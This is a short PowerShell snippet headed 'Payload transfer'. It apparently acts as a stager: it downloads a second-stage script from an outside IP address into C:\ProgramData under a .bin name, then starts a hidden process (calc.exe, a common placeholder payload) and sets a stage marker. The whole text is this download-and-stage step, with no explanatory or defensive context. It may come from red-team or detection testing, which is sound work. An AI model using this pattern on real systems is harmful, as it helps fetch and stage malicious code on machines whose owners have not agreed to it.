
# Payload transfer
$DownloadUrl = "http://203.0.113.37:8080/stage1.ps1"
$DownloadPath = "C:\ProgramData\stage1.bin"
$TimeoutSec = 164
Invoke-WebRequest -Uri $DownloadUrl -OutFile $DownloadPath -UseBasicParsing
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
$StageMarker = "stage-43"
